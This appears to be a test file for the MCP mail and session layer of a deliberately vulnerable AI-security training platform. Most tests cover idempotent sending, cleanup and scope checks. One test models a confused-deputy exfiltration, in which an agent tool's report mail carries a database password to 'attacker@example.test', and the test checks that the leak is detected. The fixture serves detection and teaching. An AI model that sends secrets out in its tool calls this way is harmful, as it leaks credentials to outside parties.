'use strict';
const test=require('node:test');
const assert=require('node:assert/strict');
const crypto=require('node:crypto');
const {createMcpPlatformSessionResolver}=require('../server/services/mcp/platformSessionBinding');
const {createDurableMcpMailResources}=require('../server/services/mcp/durableMailResources');
const {createMcpResourceRepository,_internals:resourceInternals}=require('../server/database/postgres/mcpResourceRepository');

const SCOPE=Object.freeze({targetId:'11111111-1111-4111-8111-111111111111',platformOwnerId:7,platformSessionId:71,generation:3});
const SIBLING=Object.freeze({targetId:'22222222-2222-4222-8222-222222222222',platformOwnerId:8,platformSessionId:81,generation:3});
const executionFor=scope=>({ownerKey:JSON.stringify(['MCP',String(scope.platformOwnerId)]),durableGeneration:String(scope.generation),check:async()=>true,effect:async(_key,work)=>work()});
const key=v=>[v.targetId,v.platformOwnerId,v.platformSessionId,v.generation].join(':');

function memoryRepository(){
 const targets=new Map([[key(SCOPE),'active'],[key(SIBLING),'active']]),intents=new Map(),cleanups=new Map();
 const exact=value=>{if(!targets.has(key(value)))throw Object.assign(Error('scope mismatch'),{code:'MCP_RESOURCE_RETIRED'});return key(value)};
 return{
  targets,intents,cleanups,
  async beginMailIntent(value){const target=exact(value);if(targets.get(target)!=='active')throw Object.assign(Error('retired'),{code:'MCP_RESOURCE_RETIRED'});const prior=intents.get(value.intentId);const row={...value,target,status:'pending',cleaned:false};if(prior&&Object.entries(value).some(([name,item])=>prior[name]!==item))throw Error('intent conflict');if(!prior)intents.set(value.intentId,row);return{replayed:!!prior,status:prior?.status||'pending'}},
  async markMailUncertain(value){const row=intents.get(value.intentId);if(!row||row.target!==exact(value))throw Error('intent mismatch');row.status='uncertain'},
  async markMailAccepted(value){const row=intents.get(value.intentId);if(!row||row.target!==exact(value)||row.assignedMessageId!==value.assignedMessageId)throw Error('receipt mismatch');row.status='accepted'},
  async readAcceptedMailIntent(value){const row=intents.get(value.intentId);if(!row||row.target!==exact(value)||row.status!=='accepted')return null;return{assignedMessageId:row.assignedMessageId,recipientSha256:row.recipientSha256,payloadSha256:row.payloadSha256,status:row.status}},
  async beginMailCleanup(value){const target=exact(value);if(targets.get(target)==='active')throw Error('retirement not begun');const prior=[...cleanups.values()].find(row=>row.target===target);if(prior&&prior.operationId!==value.operationId)throw Object.assign(Error('cleanup conflict'),{code:'MCP_RESOURCE_CONFLICT'});if(!prior){const messageIds=[...intents.values()].filter(row=>row.target===target&&!row.cleaned).map(row=>row.assignedMessageId).sort();cleanups.set(value.operationId,{operationId:value.operationId,target,status:'pending',messageIds});}const row=prior||cleanups.get(value.operationId);return{replayed:row.status==='completed',messageIds:row.messageIds}},
  async completeMailCleanup(value){const row=cleanups.get(value.operationId);if(!row||row.target!==exact(value)||JSON.stringify([...row.messageIds].sort())!==JSON.stringify([...value.messageIds].sort()))throw Error('cleanup mismatch');if(row.status==='completed')return row.receipt;for(const intent of intents.values())if(row.messageIds.includes(intent.assignedMessageId))intent.cleaned=true;row.status='completed';row.receipt=value.receipt;return row.receipt},
  async readMailCleanup(value){const row=cleanups.get(value.operationId);if(!row||row.target!==exact(value)||row.status!=='completed')return null;return{receipt:row.receipt,messageIds:row.messageIds}},
  retire(scope,operationId){targets.set(key(scope),'retiring');return operationId},
 };
}
const request=(token,user=7,copied=71)=>({headers:{authorization:`Bearer ${token}`},user:{id:user},session:copied==null?{}:{sessionData:{id:copied}}});

test('canonical JWT session resolution survives process restart and rejects revoked, stale and cross-owner requests',async()=>{
 const sessions=new Map([['current',{user:{id:7},session:{id:71}}]]);const validate=async token=>sessions.get(token)||null;
 const bound=await createMcpPlatformSessionResolver({validateSession:validate}).resolveRequest(request('current',7,null));
 assert.deepEqual(bound,{platformOwnerId:7,platformSessionId:71});await bound.assertCurrent();
 // A new resolver has no in-memory session dependency and revalidates the same durable token.
 assert.deepEqual(await createMcpPlatformSessionResolver({validateSession:validate}).resolveRequest(request('current')),{platformOwnerId:7,platformSessionId:71});
 await assert.rejects(createMcpPlatformSessionResolver({validateSession:validate}).resolveRequest(request('current',8)),{code:'MCP_PLATFORM_OWNER_MISMATCH'});
 await assert.rejects(createMcpPlatformSessionResolver({validateSession:validate}).resolveRequest(request('current',7,72)),{code:'MCP_PLATFORM_SESSION_MISMATCH'});
 sessions.set('current',{user:{id:7},session:{id:72}});
 await assert.rejects(bound.assertCurrent(),{code:'MCP_PLATFORM_SESSION_REQUIRED'});
 sessions.delete('current');
 await assert.rejects(bound.assertCurrent(),{code:'MCP_PLATFORM_SESSION_REQUIRED'});
 await assert.rejects(createMcpPlatformSessionResolver({validateSession:validate}).resolveRequest(request('current',7,null)),{code:'MCP_PLATFORM_SESSION_REQUIRED'});
 await assert.rejects(createMcpPlatformSessionResolver({validateSession:validate}).resolveRequest({headers:{authorization:'Bearer current extra'}}),{code:'MCP_PLATFORM_SESSION_REQUIRED'});
});

test('mail intent and assigned Message-ID are durable before SMTP is attempted',async()=>{
 const repository=memoryRepository(),intentId=crypto.randomUUID();let observed;
 const service=createDurableMcpMailResources({repository,sendMail:async mail=>{observed={...repository.intents.get(intentId)};return{ok:true,messageId:`<${mail.messageId}>`}},deleteMessages:async()=>({ok:true}),listMessages:async()=>({ok:true,messages:[]})});
 const result=await service.send({scope:SCOPE,execution:executionFor(SCOPE),intentId,to:'shared@example.test',subject:'report',body:'owned'});
 assert.equal(observed.status,'pending');assert.equal(observed.assignedMessageId,result.messageId);assert.equal(repository.intents.get(intentId).status,'accepted');
 assert.equal(JSON.stringify(observed).includes('owned'),false);
 assert.deepEqual(await service.send({scope:SCOPE,execution:executionFor(SCOPE),intentId,to:'shared@example.test',subject:'report',body:'owned'}),{ok:true,messageId:result.messageId,replayed:true});
 await assert.rejects(service.send({scope:SCOPE,execution:executionFor(SCOPE),intentId,to:'shared@example.test',subject:'changed report',body:'owned'}),/intent conflict/);
});

test('accepted-mail observation binds exact scope, recipient, payload and current protected bytes',async()=>{
 const repository=memoryRepository(),runId=crypto.randomUUID(),effectKey='mcp_tool_0_send_report';
 const intentId=require('../server/services/mcp/confusedDeputyObservation').intentIdFor(runId,effectKey);
 const service=createDurableMcpMailResources({repository,sendMail:async mail=>({ok:true,messageId:mail.messageId}),
  deleteMessages:async()=>({ok:true}),listMessages:async()=>({ok:true,messages:[]})});
 const protectedContent='DB_PASSWORD=owned-secret';
 const body=`cover\n\n--- attached internal data (auto-collected by send_report) ---\n${protectedContent}`;
 const sent=await service.send({scope:SCOPE,execution:executionFor(SCOPE),intentId,to:'attacker@example.test',subject:'Operations report',body});
 const currentExecution={...executionFor(SCOPE),runId};
 const input={scope:SCOPE,execution:currentExecution,intentId,runId,effectKey,to:'attacker@example.test',subject:'Operations report',body,
  protectedContent,messageId:sent.messageId};
 const observed=await service.observeAccepted(input);
 assert.equal(observed.confusedDeputyWitness.runId,runId);
 assert.equal(observed.confusedDeputyWitness.delivery.status,'accepted');
 assert.equal(observed.confusedDeputyWitness.protectedRead.byteCount,Buffer.byteLength(protectedContent));
 for(const changed of [
  {...input,to:'ops@acme-corp.internal'}, {...input,body:`${body} changed`},
  {...input,protectedContent:'different'}, {...input,messageId:`mcp-${crypto.randomUUID()}@owasp-ai-goat.local`},
 ]) assert.deepEqual(await service.observeAccepted(changed),{});
 await assert.rejects(service.observeAccepted({...input,scope:SIBLING}),{code:'MCP_RESOURCE_SCOPE_INVALID'});
 assert.deepEqual(await service.observeAccepted({...input,runId:crypto.randomUUID()}),{});
 assert.deepEqual(await service.observeAccepted({...input,effectKey:'mcp_tool_1_send_report'}),{});
 repository.intents.get(intentId).status='uncertain';
 assert.deepEqual(await service.observeAccepted(input),{});
 repository.intents.delete(intentId);
 assert.deepEqual(await service.observeAccepted(input),{});
 await assert.rejects(service.observeAccepted({...input,protectedContent:''}),{code:'MCP_MAIL_INVALID'});
});

test('same intent with changed subject conflicts before a second SMTP attempt',async()=>{
 const repository=memoryRepository(),intentId=crypto.randomUUID();let sends=0;
 const service=createDurableMcpMailResources({repository,sendMail:async mail=>{sends++;return{ok:true,messageId:mail.messageId}},deleteMessages:async()=>({ok:true}),listMessages:async()=>({ok:true,messages:[]})});
 await service.send({scope:SCOPE,execution:executionFor(SCOPE),intentId,to:'shared@example.test',subject:'first',body:'same body'});
 await assert.rejects(service.send({scope:SCOPE,execution:executionFor(SCOPE),intentId,to:'shared@example.test',subject:'second',body:'same body'}),/intent conflict/);
 assert.equal(sends,1);
});

test('read-only mail projection observes only exact server-owned message receipts',async()=>{
 const repository=memoryRepository(),messageId=`mcp-${crypto.randomUUID()}@owasp-ai-goat.local`;let observed;
 const service=createDurableMcpMailResources({repository,sendMail:async()=>{},deleteMessages:async()=>({ok:true}),
  listMessages:async ids=>{observed=ids;return{ok:true,messages:[{id:'mailpit-row',messageId:ids[0]}]}}});
 assert.deepEqual(await service.project({scope:SCOPE,messageIds:[messageId]}),
  {ok:true,messages:[{id:'mailpit-row',messageId}]});
 assert.deepEqual(observed,[messageId]);
 await assert.rejects(service.project({scope:SCOPE,messageIds:['foreign@example.test']}),
  {code:'MCP_MAIL_CLEANUP_INCOMPLETE'});
});

test('uncertain SMTP delivery is cleaned after service restart and sibling mail is preserved',async()=>{
 const repository=memoryRepository(),owned=crypto.randomUUID(),sibling=crypto.randomUUID();
 const common={repository,deleteMessages:async()=>({ok:true}),listMessages:async()=>({ok:true,messages:[]}),clock:()=> '2026-09-13T12:34:56.000Z'};
 const crashing=createDurableMcpMailResources({...common,sendMail:async()=>{throw Error('connection lost after DATA')}});
 await assert.rejects(crashing.send({scope:SCOPE,execution:executionFor(SCOPE),intentId:owned,to:'shared@example.test',subject:'owned',body:'owned bytes'}),/connection lost/);
 await assert.rejects(crashing.send({scope:SCOPE,execution:executionFor(SCOPE),intentId:owned,to:'shared@example.test',subject:'owned',body:'owned bytes'}),{code:'MCP_MAIL_UNCERTAIN'});
 const siblingService=createDurableMcpMailResources({...common,sendMail:async mail=>({ok:true,messageId:mail.messageId})});
 await siblingService.send({scope:SIBLING,execution:executionFor(SIBLING),intentId:sibling,to:'shared@example.test',subject:'sibling',body:'sibling bytes'});
 repository.retire(SCOPE);const deleted=[];
 const restarted=createDurableMcpMailResources({repository,sendMail:async()=>{throw Error('must not send')},deleteMessages:async ids=>{deleted.push(...ids);return{ok:true}},listMessages:async ids=>({ok:true,messages:ids.filter(id=>!deleted.includes(id))}),clock:()=> '2026-09-13T12:34:56.000Z'});
 const operationId=crypto.randomUUID(),receipt=await restarted.cleanup({scope:SCOPE,operationId});
 assert.deepEqual(deleted,[`mcp-${owned}@owasp-ai-goat.local`]);assert.equal(receipt.intentCount,1);assert.equal(repository.intents.get(sibling).cleaned,false);
 const replayed=createDurableMcpMailResources({repository,sendMail:async()=>{},deleteMessages:async()=>{throw Error('replay must not delete')},listMessages:async()=>({ok:true,messages:[]})});
 assert.deepEqual(await replayed.cleanup({scope:SCOPE,operationId}),receipt);
 await assert.rejects(replayed.cleanup({scope:{...SCOPE,platformOwnerId:8},operationId}),{code:'MCP_RESOURCE_RETIRED'});
});

test('mismatched SMTP receipt is uncertain rather than accepted',async()=>{
 const repository=memoryRepository(),intentId=crypto.randomUUID();const service=createDurableMcpMailResources({repository,sendMail:async()=>({ok:true,messageId:'foreign@local'}),deleteMessages:async()=>({ok:true}),listMessages:async()=>({ok:true,messages:[]})});
 await assert.rejects(service.send({scope:SCOPE,execution:executionFor(SCOPE),intentId,to:'shared@example.test',subject:'report',body:'body'}),{code:'MCP_MAIL_UNCERTAIN'});
 assert.equal(repository.intents.get(intentId).status,'uncertain');
});

test('mail cleanup binds one retirement operation and concurrent completion replays its persisted receipt',async()=>{
 const repository=memoryRepository(),intentId=crypto.randomUUID(),operationId=crypto.randomUUID();let release;
 const gate=new Promise(resolve=>{release=resolve});let entered=0;
 const service=createDurableMcpMailResources({repository,sendMail:async mail=>({ok:true,messageId:mail.messageId}),
  deleteMessages:async()=>{entered++;if(entered===2)release();await gate;return{ok:true}},listMessages:async()=>({ok:true,messages:[]}),
  clock:(()=>{let n=0;return()=>`2026-09-13T12:34:5${n++}.000Z`;})()});
 await service.send({scope:SCOPE,execution:executionFor(SCOPE),intentId,to:'shared@example.test',subject:'subject',body:'body'});
 repository.retire(SCOPE,operationId);
 const first=service.cleanup({scope:SCOPE,operationId});const second=service.cleanup({scope:SCOPE,operationId});
 const [a,b]=await Promise.all([first,second]);assert.deepEqual(b,a);assert.equal(repository.cleanups.get(operationId).receipt,a);
 await assert.rejects(service.cleanup({scope:SCOPE,operationId:crypto.randomUUID()}),{code:'MCP_RESOURCE_CONFLICT'});
});

test('cleanup rejects malformed repository Message-IDs before touching SMTP',async()=>{
 const repository=memoryRepository(),operationId=crypto.randomUUID();repository.retire(SCOPE,operationId);
 repository.beginMailCleanup=async()=>({replayed:false,messageIds:['foreign@example.test']});let deletes=0;
 const service=createDurableMcpMailResources({repository,sendMail:async()=>{},deleteMessages:async()=>{deletes++;return{ok:true}},listMessages:async()=>({ok:true,messages:[]})});
 await assert.rejects(service.cleanup({scope:SCOPE,operationId}),{code:'MCP_MAIL_CLEANUP_INCOMPLETE'});assert.equal(deletes,0);
});

test('cleanup receipt read rejects a malformed persisted Message-ID before SMTP observation',async()=>{
 const repository=memoryRepository(),operationId=crypto.randomUUID(),completedAt='2026-09-13T12:34:56.000Z';
 const body={version:1,...SCOPE,operationId,status:'completed',intentCount:1,completedAt,cleanupPending:false};
 const receipt={...body,receiptSha256:crypto.createHash('sha256').update(JSON.stringify(Object.fromEntries(Object.keys(body).sort().map(name=>[name,body[name]])))).digest('hex')};
 repository.readMailCleanup=async()=>({receipt,messageIds:['foreign@example.test']});let reads=0;
 const service=createDurableMcpMailResources({repository,sendMail:async()=>{},deleteMessages:async()=>({ok:true}),listMessages:async()=>{reads++;return{ok:true,messages:[]}}});
 await assert.rejects(service.readCleanup({scope:SCOPE,operationId}),{code:'MCP_MAIL_CLEANUP_INCOMPLETE'});assert.equal(reads,0);
});

test('mail send rejects stale owner execution before intent or SMTP effects',async()=>{
 const repository=memoryRepository();let sends=0;const service=createDurableMcpMailResources({repository,sendMail:async()=>{sends++;return{ok:true}},deleteMessages:async()=>({ok:true}),listMessages:async()=>({ok:true,messages:[]})});
 const input={scope:SCOPE,execution:{...executionFor(SCOPE),durableGeneration:'2'},intentId:crypto.randomUUID(),to:'shared@example.test',subject:'report',body:'body'};
 await assert.rejects(service.send(input),{code:'MCP_RESOURCE_SCOPE_INVALID'});assert.equal(sends,0);assert.equal(repository.intents.size,0);
});

test('repository receipt validation binds canonical scope, count, operation and time',()=>{
 const operationId=crypto.randomUUID(),body={version:1,...SCOPE,operationId,status:'completed',intentCount:2,completedAt:'2026-09-13T12:34:56.000Z',cleanupPending:false};
 const receipt={...body,receiptSha256:crypto.createHash('sha256').update(JSON.stringify(Object.fromEntries(Object.keys(body).sort().map(name=>[name,body[name]])))).digest('hex')};
 assert.doesNotThrow(()=>resourceInternals.completedReceipt(receipt,{...SCOPE,operationId},2));
 assert.throws(()=>resourceInternals.completedReceipt({...receipt,platformOwnerId:8},{...SCOPE,operationId},2),{code:'MCP_RESOURCE_SCOPE_INVALID'});
 assert.throws(()=>resourceInternals.completedReceipt({...receipt,completedAt:'2026-09-13T12:34:56Z'},{...SCOPE,operationId},2),{code:'MCP_RESOURCE_SCOPE_INVALID'});
 assert.throws(()=>resourceInternals.completedReceipt(receipt,{...SCOPE,operationId},1),{code:'MCP_RESOURCE_SCOPE_INVALID'});
 const runnerBody={version:1,targetId:SCOPE.targetId,ownerId:SCOPE.platformOwnerId,platformSessionId:SCOPE.platformSessionId,
  generation:SCOPE.generation,operationId,status:'completed',completedAt:'2026-09-13T12:34:56.000Z',cleanupPending:false};
 const runnerReceipt={...runnerBody,receiptSha256:crypto.createHash('sha256').update(JSON.stringify(Object.fromEntries(Object.keys(runnerBody).sort().map(name=>[name,runnerBody[name]])))).digest('hex')};
 assert.doesNotThrow(()=>resourceInternals.completedRunnerReceipt(runnerReceipt,{...SCOPE,operationId}));
 assert.throws(()=>resourceInternals.completedRunnerReceipt({...runnerReceipt,ownerId:8},{...SCOPE,operationId}),{code:'MCP_RESOURCE_SCOPE_INVALID'});
});

test('mail cleanup repository locks target, retirement, cleanup and intents in one order',async()=>{
 const operationId=crypto.randomUUID(),messageId=`mcp-${crypto.randomUUID()}@owasp-ai-goat.local`,queries=[];let cleanupExists=false;
 const cleanup=()=>({operation_id:operationId,target_id:SCOPE.targetId,user_key:String(SCOPE.platformOwnerId),
  platform_session_id:SCOPE.platformSessionId,generation:SCOPE.generation,status:'pending',message_ids:[messageId]});
 const client={release(){},async query(sql){
  const text=String(sql).replace(/\s+/g,' ').trim();queries.push(text);
  if(text==='BEGIN'||text==='COMMIT'||text==='ROLLBACK')return{rows:[],rowCount:0};
  if(text.includes('FROM mcp.runner_targets')&&text.includes('FOR UPDATE'))return{rows:[{user_key:String(SCOPE.platformOwnerId),platform_session_id:SCOPE.platformSessionId,generation:SCOPE.generation,state:'retiring'}],rowCount:1};
  if(text.includes('FROM mcp.runner_target_cleanups')&&text.includes('FOR UPDATE'))return{rows:[{target_id:SCOPE.targetId,user_key:String(SCOPE.platformOwnerId),platform_session_id:SCOPE.platformSessionId,generation:SCOPE.generation,status:'pending'}],rowCount:1};
  if(text.includes('FROM mcp.mail_cleanups')&&text.includes('FOR UPDATE'))return{rows:cleanupExists?[cleanup()]:[],rowCount:cleanupExists?1:0};
  if(text.startsWith('SELECT assigned_message_id FROM mcp.mail_intents'))return{rows:[{assigned_message_id:messageId}],rowCount:1};
  if(text.startsWith('INSERT INTO mcp.mail_cleanups')){cleanupExists=true;return{rows:[],rowCount:1};}
  if(text.startsWith('UPDATE mcp.mail_intents')||text.startsWith('UPDATE mcp.mail_cleanups'))return{rows:[],rowCount:1};
  throw Error(`Unexpected query: ${text}`);
 }};
 const repository=createMcpResourceRepository({connect:async()=>client});
 await repository.beginMailCleanup({...SCOPE,operationId});
 const completedAt='2026-09-13T12:34:56.000Z';
 const body={version:1,...SCOPE,operationId,status:'completed',intentCount:1,completedAt,cleanupPending:false};
 const receipt={...body,receiptSha256:crypto.createHash('sha256').update(JSON.stringify(Object.fromEntries(Object.keys(body).sort().map(name=>[name,body[name]])))).digest('hex')};
 await repository.completeMailCleanup({...SCOPE,operationId,messageIds:[messageId],receipt});
 const ordered=queries.filter(sql=>sql.includes('FOR UPDATE')).map(sql=>{
  if(sql.includes('mcp.runner_targets'))return'target';if(sql.includes('mcp.runner_target_cleanups'))return'retirement';
  if(sql.includes('mcp.mail_cleanups'))return'cleanup';if(sql.includes('mcp.mail_intents'))return'intents';return'unknown';
 });
 assert.deepEqual(ordered,['target','retirement','cleanup','intents','target','retirement','cleanup','intents']);
});
